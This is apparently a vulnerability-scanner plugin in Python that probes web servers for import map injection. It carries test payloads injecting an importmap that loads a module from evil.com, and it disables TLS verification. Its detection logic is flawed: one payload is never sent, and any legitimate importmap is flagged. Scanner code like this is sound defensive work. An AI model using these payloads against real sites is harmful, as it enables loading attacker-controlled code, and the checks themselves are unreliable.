import asyncio
import ssl
import re
from plugins import NaslPlugin, PluginResult


class ImportMapInjection(NaslPlugin):
    PLUGIN_ID = 1195
    NAME = 'Import Map / Dependency Injection Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 7.5
    DESCRIPTION = 'Detects import map injection vulnerabilities where an attacker can manipulate module resolution via injected importmap HTML elements. Import maps control how JavaScript modules are resolved; injection allows loading attacker-controlled modules.'
    SOLUTION = 'Use CSP to restrict script-src and trust-types. Validate all user input rendered in HTML. Sanitize HTML to prevent importmap element injection.'
    CVE = []
    PORTS = [80, 443, 8080, 8443]

    TEST_PAYLOADS = [
        '<script type="importmap">{"imports":{"module":"https://evil.com/module.js"}}</script>',
        '?importmap={"imports":{"module":"https://evil.com/module.js"}}',
    ]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []
        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                importmap_found = False
                reflected = False
                for payload in self.TEST_PAYLOADS:
                    path = payload if payload.startswith('/') else '/'
                    if payload.startswith('?'):
                        path = f'/{payload}'
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port_to_check, ssl=ctx), timeout=5)
                    req = f'GET {path} HTTP/1.1\r\nHost: {host_header}\r\nConnection: close\r\n\r\n'
                    writer.write(req.encode())
                    await writer.drain()
                    response = b''
                    try:
                        while True:
                            chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                            if not chunk: break
                            response += chunk
                            if len(response) > 32768: break
                    except asyncio.TimeoutError:
                        pass
                    writer.close()
                    await writer.wait_closed()
                    if response:
                        header_section = response.split(b'\r\n\r\n')[0].decode('utf-8', errors='ignore')
                        body = response.split(b'\r\n\r\n', 1)
                        if len(body) > 1:
                            html = body[1].decode('utf-8', errors='ignore')
                            if 'type="importmap"' in html.lower() or "type='importmap'" in html.lower():
                                importmap_found = True
                            if 'evil.com' in html or 'importmap' in html.lower():
                                content_type = ''
                                for line in header_section.split('\r\n'):
                                    if line.lower().startswith('content-type:'):
                                        content_type = line.split(':', 1)[1].strip()
                                if 'evil.com' in html:
                                    reflected = True

                if not importmap_found and not reflected:
                    results.append(PluginResult(
                        vulnerable=False, target=target, port=port_to_check,
                        description='No issues detected'
                    ))
                else:
                    evidence_parts = []
                    if importmap_found:
                        evidence_parts.append('importmap elements detected in page HTML')
                    if reflected:
                        evidence_parts.append('Import map injection payload reflected in response')
                    results.append(PluginResult(
                        vulnerable=True, target=target, port=port_to_check,
                        cvss_score=self.CVSS_SCORE, severity='high',
                        description=f'Import map injection risk: {" and ".join(evidence_parts)}',
                        solution=self.SOLUTION,
                        evidence='; '.join(evidence_parts)
                    ))
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                results.append(PluginResult(
                    vulnerable=False, target=target, port=port_to_check,
                    description='No issues detected'
                ))
        if not results:
            results.append(PluginResult(vulnerable=False, target=target, port=port or 0, description='No issues detected'))
        return results
